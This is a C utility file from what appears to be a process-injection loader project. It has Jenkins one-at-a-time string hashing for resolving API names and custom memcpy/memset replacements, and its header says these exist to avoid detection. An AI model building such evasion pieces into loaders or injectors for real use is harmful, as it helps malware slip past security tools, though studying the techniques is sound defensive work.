/*
	WinApi.c - CRT and string hashing utilities
	------------------------------------------
	Purpose:
		- Provides replacements for standard CRT functions to reduce dependencies and avoid detection.
		- Implements string hashing functions for API and module resolution.
	Main Functions:
		- Jenkins one-at-a-time hash for ASCII and wide strings.
		- Custom implementations of memset, memcpy, and character case conversion.
	Role in Project:
		- Supports API hashing and memory operations used throughout the loader and injection routines.
*/

#include <Windows.h>

#include "Structs.h"
#include "Common.h"


UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenA(String);

	while (Index != Length)
	{
		Hash += String[Index++];
		Hash += Hash << INITIAL_SEED;
		Hash ^= Hash >> 6;
	}

	Hash += Hash << 3;
	Hash ^= Hash >> 11;
	Hash += Hash << 15;

	return Hash;
}


UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenW(String);

	while (Index != Length)
	{
		Hash += String[Index++];
		Hash += Hash << INITIAL_SEED;
		Hash ^= Hash >> 6;
	}

	Hash += Hash << 3;
	Hash ^= Hash >> 11;
	Hash += Hash << 15;

	return Hash;
}



CHAR _toUpper(CHAR C)
{
	if (C >= 'a' && C <= 'z')
		return C - 'a' + 'A';

	return C;
}

PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size)
{
	for (volatile int i = 0; i < Size; i++) {
		((BYTE*)Destination)[i] = ((BYTE*)Source)[i];
	}
	return Destination;
}



extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)
#pragma function(memset)

void* __cdecl memset(void* Destination, int Value, size_t Size) {
	unsigned char* p = (unsigned char*)Destination;
	while (Size > 0) {
		*p = (unsigned char)Value;
		p++;
		Size--;
	}
	return Destination;
}

